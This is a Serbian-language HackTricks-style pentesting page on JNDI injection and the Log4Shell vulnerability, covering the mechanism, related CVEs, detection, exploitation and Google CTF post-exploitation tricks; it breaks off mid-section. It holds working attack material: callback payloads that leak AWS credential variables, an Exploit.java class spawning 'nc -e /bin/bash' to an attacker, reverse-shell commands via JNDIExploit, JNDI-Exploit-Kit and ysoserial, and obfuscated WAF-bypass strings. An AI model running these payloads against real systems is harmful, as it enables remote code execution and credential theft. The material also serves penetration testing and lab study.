# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Osnovne informacije

JNDI, integrisan u Javu od kasnih 1990-ih, slu쬴 kao direktorijumski servis, omogu캖avaju캖i Java programima da prona캠u podatke ili objekte putem sistema imenovanja. Podr쬬va razli캜ite direktorijumske servise putem provajdera usluga (SPI), omogu캖avaju캖i povla캜enje podataka sa razli캜itih sistema, uklju캜uju캖i udaljene Java objekte. 캛esti SPI-ovi uklju캜uju CORBA COS, Java RMI Registry i LDAP.

### JNDI Imenovanje Reference

Java objekti mogu biti sme코teni i povu캜eni kori코캖enjem JNDI Imenovanih Referenci, koje dolaze u dva oblika:

* **Reference Adrese**: Specificira lokaciju objekta (npr. _rmi://server/ref_), omogu캖avaju캖i direktno povla캜enje sa odre캠ene adrese.
* **Udaljeni Fabrika**: Referenca na udaljenu fabri캜ku klasu. Kada se pristupi, klasa se preuzima i instancira sa udaljene lokacije.

Me캠utim, ovaj mehanizam mo쬰 biti iskori코캖en, potencijalno dovode캖i do u캜itavanja i izvr코avanja proizvoljnog koda. Kao mera za코tite:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` po podrazumevanim postavkama od JDK 7u21, ograni캜avaju캖i u캜itavanje udaljenih objekata. Bezbednosni menad쬰r dodatno ograni캜ava 코ta mo쬰 biti u캜itano.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` po podrazumevanim postavkama od JDK 6u141, 7u131, 8u121, blokira izvr코avanje udaljeno u캜itanih Java objekata. Ako je postavljeno na `true`, izvr코avanje udaljenog koda je mogu캖e bez nadzora Bezbednosnog Menad쬰ra.
* **CORBA**: Nema specifi캜no svojstvo, ali Bezbednosni Menad쬰r je uvek aktivan.

Me캠utim, **Menad쬰r Imenovanja**, odgovoran za re코avanje JNDI veza, nema ugra캠ene mehanizme bezbednosti, 코to potencijalno omogu캖ava povla캜enje objekata sa bilo kog izvora. Ovo predstavlja rizik jer se za코tite RMI, LDAP i CORBA mogu zaobi캖i, 코to dovodi do u캜itavanja proizvoljnih Java objekata ili iskori코캖avanja postoje캖ih komponenti aplikacije (gad쬰ta) za pokretanje zlonamernog koda.

Primeri iskori코캖ivih URL-ova uklju캜uju:

* _rmi://napadac-server/bar_
* _ldap://napadac-server/bar_
* _iiop://napadac-server/bar_

I pored za코tita, ranjivosti ostaju, uglavnom zbog nedostatka za코tite od u캜itavanja JNDI sa nepoverenih izvora i mogu캖nosti zaobila쬰nja postoje캖ih za코tita.

### Primer JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

캛ak i ako ste postavili **`PROVIDER_URL`**, mo쬰te nazna캜iti druga캜iji u pretrazi i bi캖e pristupljeno: `ctx.lookup("<kontrolisani-url-napada캜a>")` i to je ono 코to 캖e napada캜 iskoristiti da u캜ita proizvoljne objekte sa sistema koji kontroli코e.

### Pregled CORBA

CORBA (Common Object Request Broker Architecture) koristi **Interoperabilnu Referencu Objekta (IOR)** da jedinstveno identifikuje udaljene objekte. Ova referenca uklju캜uje osnovne informacije kao 코to su:

* **ID Tipa**: Jedinstveni identifikator za interfejs.
* **Codebase**: URL za dobijanje stub klase.

Va쬹o je napomenuti da CORBA nije inherentno ranjiv. Osiguravanje bezbednosti obi캜no uklju캜uje:

* Instalacija **Bezbednosnog Menad쬰ra**.
* Konfigurisanje Bezbednosnog Menad쬰ra da dozvoli konekcije ka potencijalno zlonamernim codebase-ovima. Ovo se mo쬰 posti캖i kroz:
* Dozvole za sokete, npr. `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Dozvole za 캜itanje fajlova, ili univerzalno (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) ili za specifi캜ne direktorijume gde bi zlonamerni fajlovi mogli biti sme코teni.

Me캠utim, neka pravila prodavaca mogu biti popustljiva i dozvoliti ove konekcije po podrazumevanim postavkama.

### RMI Kontekst

Za RMI (Remote Method Invocation), situacija je donekle druga캜ija. Kao i kod CORBA-e, u캜itavanje proizvoljnih klasa je podrazumevano ograni캜eno. Da bi se iskoristio RMI, obi캜no bi bilo potrebno zaobi캖i Bezbednosnog Menad쬰ra, 코to je tako캠e relevantno i kod CORBA-e.

### LDAP

Prvo, moramo razlikovati izme캠u Pretrage i Pogleda.\
**Pretraga** 캖e koristiti URL poput `ldap://localhost:389/o=JNDITutorial` da prona캠e JNDITutorial objekat sa LDAP servera i **dobije njegove atribute**.\
**Pogled** je namenjen **imenovanim servisima** jer 쬰limo da dobijemo **코ta god je vezano za ime**.

Ako je LDAP pretraga pozvana sa **SearchControls.setReturningObjFlag() sa `true`, onda 캖e vra캖eni objekat biti rekonstruisan**.

Stoga, postoji nekoliko na캜ina za napad na ove opcije.\
**Napada캜 mo쬰 otrovati LDAP zapise unose캖i payload-ove** na njih koji 캖e biti izvr코eni u sistemima koji ih prikupljaju (veoma korisno za **kompromitovanje desetina ma코ina** ako imate pristup LDAP serveru). Jo코 jedan na캜in za iskori코캖avanje ovoga bi bilo izvo캠enje **MitM napada u LDAP pretrazi** na primer.

U slu캜aju da mo쬰te **naterati aplikaciju da re코i JNDI LDAP URL**, mo쬰te kontrolisati LDAP koji 캖e biti pretra쬰n, i mo쬰te poslati nazad eksploataciju (log4shell).

#### Eksploatacija deserijalizacije

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**Eksploatacija je serializovana** i bi캖e deserijalizovana.\
U slu캜aju da je `trustURLCodebase` `true`, napada캜 mo쬰 obezbediti svoje klase u codebase-u, ako nije, mora캖e iskoristiti ged쬰te u putanji klasa.

#### Eksploatacija JNDI Reference

Lak코e je napasti ovaj LDAP koriste캖i **JavaFactory reference**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell Ranjivost

Ranjivost je uvedena u Log4j jer podr쬬va [**specijalnu sintaksu**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) u obliku `${prefix:name}` gde je `prefix` jedan od razli캜itih [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) gde bi `name` trebalo da bude evaluiran. Na primer, `${java:version}` je trenutna pokrenuta verzija Jave.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) je uveo funkciju `jndi` Lookup. Ova funkcija omogu캖ava dobijanje promenljivih putem JNDI-ja. Tipi캜no, klju캜 je automatski prefiksovan sa `java:comp/env/`. Me캠utim, ako sam klju캜 sadr쬴 **":"**, ovaj podrazumevani prefiks se ne primenjuje.

Sa **: prisutnim** u klju캜u, kao u `${jndi:ldap://primer.com/a}` nema prefiksa i **LDAP server je upitan za objekat**. I ovi Lookups se mogu koristiti kako u konfiguraciji Log4j tako i prilikom logovanja linija.

Stoga, jedina stvar potrebna za dobijanje RCE je **ranjiva verzija Log4j koja obra캠uje informacije koje kontroli코e korisnik**. I po코to je ovo biblioteka 코iroko kori코캖ena od strane Java aplikacija za logovanje informacija (uklju캜uju캖i i aplikacije na internetu), bilo je veoma uobi캜ajeno imati log4j logovanje na primer HTTP zaglavlja primljena kao User-Agent. Me캠utim, log4j se **ne koristi samo za logovanje HTTP informacija ve캖 bilo kakvog unosa** i podataka koje je programer nazna캜io.
## Pregled CVE-ova povezanih sa Log4Shell-om

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Kriti캜no]**

Ova ranjivost je kriti캜na **nesigurna deserializacijska gre코ka** u komponenti `log4j-core`, koja uti캜e na verzije od 2.0-beta9 do 2.14.1. Omogu캖ava **udaljeno izvr코avanje koda (RCE)**, omogu캖avaju캖i napada캜ima preuzimanje sistema. Problem je prijavio Chen Zhaojun iz Alibaba Cloud Security tima i uti캜e na razli캜ite Apache okvire. Po캜etni popravak u verziji 2.15.0 bio je nepotpun. Sigma pravila za odbranu su dostupna ([Pravilo 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Pravilo 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Kriti캜no]**

Inicialno ocenjena kao niska, ali kasnije unapre캠ena u kriti캜nu, ova CVE je **DoS (Denial of Service)** gre코ka proiza코la iz nepotpunog popravka u verziji 2.15.0 za CVE-2021-44228. Uti캜e na nezadane konfiguracije, omogu캖avaju캖i napada캜ima izazivanje DoS napada putem prilago캠enih paketa. Jedan [tvit](https://twitter.com/marcioalm/status/1471740771581652995) prikazuje metodu zaobila쬰nja. Problem je re코en u verzijama 2.16.0 i 2.12.2 uklanjanjem 코ablona pretrage poruka i onemogu캖avanjem JNDI po zadanom.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Visoko]**

Uticaj na **Log4j 1.x verzije** u nezadanim konfiguracijama koje koriste `JMSAppender`, ova CVE je nesigurna deserializacijska gre코ka. Nema dostupnog popravka za granu 1.x, koja je dostigla kraj 쬴votnog ciklusa, i preporu캜uje se nadogradnja na `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Umereno]**

Ova ranjivost uti캜e na **Logback logging framework**, naslednika Log4j 1.x. Ranije smatran sigurnim, okvir je prona캠en ranjivim, i novije verzije (1.3.0-alpha11 i 1.2.9) su objavljene radi re코avanja problema.

### **CVE-2021-45105** **\[Visoko]**

Log4j 2.16.0 sadr쬴 DoS gre코ku, 코to je dovelo do izdavanja `log4j 2.17.0` za re코avanje CVE-a. Vi코e detalja mo쬰te prona캖i u BleepingComputer-ovom [izve코taju](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Uticaj na log4j verziju 2.17, ova CVE zahteva od napada캜a kontrolu konfiguracione datoteke log4j. Uklju캜uje potencijalno izvr코avanje proizvoljnog koda putem konfigurisanog JDBCAppender-a. Vi코e detalja dostupno je u [Checkmarx blog postu](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Eksploatacija Log4Shell-a

### Otkri캖e

Ova ranjivost je veoma lako otkriti ako nije za코ti캖ena, jer 캖e poslati bar jedan **DNS zahtev** na adresu koju nazna캜ite u va코em paketu. Stoga, paketi poput:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (koriste캖i [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (koriste캖i [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (koriste캖i Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (koriste캖i [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (koriste캖i [huntress](https://log4shell.huntress.com))

Napomena da **캜ak i ako se primi DNS zahtev, to ne zna캜i da je aplikacija iskori코캖iva** (ili 캜ak ranjiva), mora캖ete poku코ati da je iskoristite.

{% hint style="info" %}
Zapamtite da za **iskori코캖avanje verzije 2.15** morate dodati **bajpas provere lokalnog ra캜unara**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Lokalno otkri캖e**

Pretra쬴te **lokalne ranjive verzije** biblioteke sa:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifikacija**

Neke od platformi navedenih ranije 캖e vam omogu캖iti da unesete neke promenljive podatke koji 캖e biti zabele쬰ni kada se zatra쬰.\
Ovo mo쬰 biti veoma korisno za 2 stvari:

* Da **verifikujete** ranjivost
* Da **eksfiltrirate informacije** zloupotrebom ranjivosti

Na primer, mo쬰te zatra쬴ti ne코to kao:\
ili kao `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i ako se **DNS zahtev primi sa vredno코캖u env promenljive**, znate da je aplikacija ranjiva.

Druge informacije koje biste mogli poku코ati da **procurite**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Informacije

{% hint style="info" %}
Sistemi koji koriste JDK verzije iznad 6u141, 7u131 ili 8u121 su za코ti캖eni od LDAP napada putem u캜itavanja klasa. Ovo je zbog podrazumevanog deaktiviranja `com.sun.jndi.ldap.object.trustURLCodebase`, 코to spre캜ava JNDI da u캜ita udaljeni URL k칪d putem LDAP-a. Me캠utim, va쬹o je napomenuti da ove verzije **nisu za코ti캖ene od napada putem deserializacije**.

Za napada캜e koji ciljaju da iskoriste ove vi코e verzije JDK-a, neophodno je iskoristiti **povereni ure캠aj (gadget)** unutar Java aplikacije. Alati poput ysoserial ili JNDIExploit 캜esto se koriste u tu svrhu. Nasuprot tome, iskori코캖avanje ni쬴h verzija JDK-a je relativno lak코e jer se ove verzije mogu manipulisati da u캜itaju i izvr코e proizvoljne klase.

Za **vi코e informacija** (_kao 코to su ograni캜enja na RMI i CORBA vektorima_) **proverite prethodni odeljak o JNDI Naming Reference** ili [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec sa prilago캠enim optere캖enjem

Mo쬰te testirati ovo na **THM box-u:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Koristite alat [**marshalsec**](https://github.com/mbechler/marshalsec) (jar verzija dostupna [**ovde**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ovaj pristup uspostavlja LDAP referal server za preusmeravanje veza ka sekundarnom HTTP serveru gde 캖e biti sme코ten eksploatacioni kod:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Da biste naveli cilj da u캜ita kod obrnutog 코koljka, kreirajte Java datoteku nazvanu `Exploit.java` sa sadr쬬jem ispod:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompajlujte Java fajl u klasni fajl koriste캖i: `javac Exploit.java -source 8 -target 8`. Zatim pokrenite **HTTP server** u direktorijumu koji sadr쬴 klasni fajl koriste캖i: `python3 -m http.server`. Proverite da **marshalsec LDAP server** referi코e na ovaj HTTP server.

Pokrenite izvr코enje klase exploit na podlo쬹om veb serveru slanjem payloada koji li캜i na:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Napomena:** Ova eksploatacija se oslanja na konfiguraciju Java-e koja dozvoljava u캜itavanje udaljenog koda putem LDAP-a. Ako ovo nije dozvoljeno, razmotrite eksploataciju pouzdane klase za izvr코avanje proizvoljnog koda.

### RCE - **JNDIExploit**

{% hint style="info" %}
Imajte na umu da je autor iz nekog razloga uklonio ovaj projekat sa github-a nakon otkri캖a log4shell-a. Mo쬰te prona캖i ke코iranu verziju na [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) ali ako 쬰lite da po코tujete odluku autora, koristite drugi metod za eksploataciju ove ranjivosti.

Tako캠e, ne mo쬰te prona캖i izvorni kod na wayback machine-u, pa ili analizirajte izvorni kod ili izvr코ite jar znaju캖i da ne znate 코ta izvr코avate.
{% endhint %}

Za ovaj primer mo쬰te pokrenuti ovaj **ranjivi web server za log4shell** na portu 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_u README-u 캖ete prona캖i kako da ga pokrenete_). Ova ranjiva aplikacija bele쬴 sadr쬬j zaglavlja HTTP zahteva _X-Api-Version_ pomo캖u ranjive verzije log4shell-a.

Zatim, mo쬰te preuzeti **JNDIExploit** jar fajl i izvr코iti ga sa:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Nakon 코to pro캜itate kod samo nekoliko minuta, u _com.feihong.ldap.LdapServer_ i _com.feihong.ldap.HTTPServer_ mo쬰te videti kako su **LDAP i HTTP serveri kreirani**. LDAP server 캖e razumeti koji payload treba poslu쬴ti i preusmeriti rtvu na HTTP server, koji 캖e poslu쬴ti eksploataciju.\
U _com.feihong.ldap.gadgets_ mo쬰te prona캖i **neke specifi캜ne ged쬰te** koji se mogu koristiti za izvr코enje 쬰ljene radnje (potencijalno izvr코iti proizvoljni kod). A u _com.feihong.ldap.template_ mo쬰te videti razli캜ite klase predlo쬬ka koje 캖e **generisati eksploate**.

Mo쬰te videti sve dostupne eksploate sa **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Neke korisne su:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Dakle, u na코em primeru, ve캖 imamo tu docker ranjivu aplikaciju koja se izvr코ava. Da bismo je napali:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kada po코aljete napade, vide캖ete izlaz u terminalu gde ste izvr코ili **JNDIExploit-1.2-SNAPSHOT.jar**.

**Zapamtite da proverite `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` za druge opcije eksploatacije. Tako캠e, u slu캜aju potrebe, mo쬰te promeniti portove LDAP i HTTP servera.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Na sli캜an na캜in kao i prethodni eksploit, mo쬰te poku코ati da koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da iskoristite ovu ranjivost.\
Mo쬰te generisati URL-ove koje 캖ete poslati rtvi pokretanjem:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Napad kori코캖enjem prilago캠enog generisanog Java objekta radi캖e u laboratorijama poput **THM solar room**. Me캠utim, ovo obi캜no ne캖e raditi (jer Java podrazumevano nije konfigurisana da u캜itava udaljene codebase-ove koriste캖i LDAP) mislim zato 코to ne zloupotrebljava pouzdanu klasu da izvr코i proizvoljni kod._

### RCE - ysoserial & JNDI-Exploit-Kit

Ova opcija je zaista korisna za napade na **Java verzije konfigurisane da veruju samo odre캠enim klasama, a ne svima**. Stoga 캖e **ysoserial** biti kori코캖en za generisanje **serijalizacija pouzdanih klasa** koje mogu biti kori코캖ene kao ged쬰ti za **izvr코avanje proizvoljnog koda** (_pouzdana klasa zloupotrebljena od strane ysoserial-a mora biti kori코캖ena od strane rtvinog Java programa kako bi eksploatacija funkcionisala_).

Kori코캖enjem **ysoserial**-a ili [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) mo쬰te kreirati deserializacijski eksploit koji 캖e biti preuzet putem JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da biste generisali **JNDI linkove** gde 캖e eksploit 캜ekati konekcije sa ranjivih ma코ina. Mo쬰te poslu쬴ti **razli캜ite eksploite koji se mogu automatski generisati** pomo캖u JNDI-Exploit-Kit-a ili 캜ak va코e **sopstvene deserializacijske payload-e** (generisane od strane vas ili ysoserial-a).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Sada mo쬰te lako koristiti generisani JNDI link da iskoristite ranjivost i dobijete **obrnuti shell** jednostavno slanjem na ranjivu verziju log4j-a: **`${ldap://10.10.14.10:1389/generated}`**

### Zaobilazi
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:캼}}:ldap://...} //Notice the unicode "i"
```
### Automatski skeneri

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Prona캠ite lokalne ranjive biblioteke

### Laboratorije za testiranje

* [**LogForge HTB ma코ina**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar soba**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Nakon eksploatacije Log4Shell-a

U ovom [**CTF writeup-u**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) dobro je obja코njeno kako je potencijalno **mogu캖e zloupotrebiti** neke funkcije **Log4J**-a.

Na [**stranici sa bezbedno코캖u**](https://logging.apache.org/log4j/2.x/security.html) Log4j-a postoje neke zanimljive re캜enice:

> Od verzije 2.16.0 (za Java 8), **funkcionalnost pretrage poruka je potpuno uklonjena**. **Pretrage u konfiguraciji i dalje funkcioni코u**. Pored toga, Log4j sada podrazumevano onemogu캖ava pristup JNDI-ju. Pretrage JNDI-ja u konfiguraciji sada moraju biti eksplicitno omogu캖ene.

> Od verzije 2.17.0, (i 2.12.3 i 2.3.1 za Java 7 i Java 6), **samo se niske pretrage u konfiguraciji rekurzivno pro코iruju**; u bilo kojoj drugoj upotrebi, samo se re코ava pretraga na vrhu, a bilo koje ugne쮃년ne pretrage se ne re코avaju.

To zna캜i da podrazumevano mo쬰te **zaboraviti na kori코캖enje bilo kog `jndi` eksploata**. 맚avi코e, da biste izvr코ili **rekurzivne pretrage**, morate ih imati konfigurisane.

Na primer, u tom CTF-u je to bilo konfigurisano u datoteci log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

U [ovom CTF-u](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) napada캜 je kontrolisao vrednost `${sys:cmd}` i trebao je da eksfiltrira zastavu iz promenljive okru쬰nja.\
Kao 코to je prikazano na ovoj stranici u [**prethodnim payload-ima**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) postoje razli캜iti na캜ini pristupa env promenljivama, kao 코to su: **`${env:FLAG}`**. U ovom CTF-u to nije bilo korisno, ali mo쬯a jeste u drugim stvarnim scenarijima.

### Eksfiltracija u izuzecima

U CTF-u, **niste mogli pristupiti stderr-u** java aplikacije koriste캖i log4J, ali Log4J **izuzeci se 코alju na stdout**, 코to je bilo prikazano u python aplikaciji. To zna캜i da je okida캜em izuzetka mogu캖e pristupiti sadr쬬ju. Izuzetak za eksfiltraciju zastave bio je: **`${java:${env:FLAG}}`.** Ovo funkcioni코e jer **`${java:CTF{blahblah}}`** ne postoji i bi캖e prikazan izuzetak sa vredno코캖u zastave:

![](<../../.gitbook/assets/image (157).png>)

### Konverzioni obrasci izuzeci

Samo da pomenemo, mogli ste tako캠e ubaciti nove [**konverzione obrasce**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i okinuti izuzetke koji 캖e biti zabele쬰ni u `stdout`. Na primer:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Ovo nije bilo korisno za eksfiltraciju datuma unutar poruke o gre코ci, jer pre konverzionog obrasca nije re코eno pretra쬴vanje, ali bi moglo biti korisno za druge stvari poput detektovanja.

### Konverzioni obrasci Regex

Me캠utim, mogu캖e je koristiti neke **konverzione obrasce koji podr쬬vaju regexe** za eksfiltraciju informacija iz pretrage kori코캖enjem regexa i zloupotrebe **binarnog pretra쬴vanja** ili **baziranih na vremenu** pona코anja.

* **Binarno pretra쬴vanje putem poruka o gre코kama**

Konverzioni obrazac **`%replace`** mo쬰 se koristiti za **zamenu** **sadr쬬ja** iz **stringa** 캜ak i kori코캖enjem **regexa**. Radi na slede캖i na캜in: `replace{pattern}{regex}{substitution}`\
Zloupotrebom ovog pona코anja mogli biste napraviti zamenu **okida캜em izuzetka ako regex odgovara** bilo 캜emu unutar stringa (i bez izuzetka ako nije prona캠eno) na ovaj na캜in:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Vremenski bazirano**

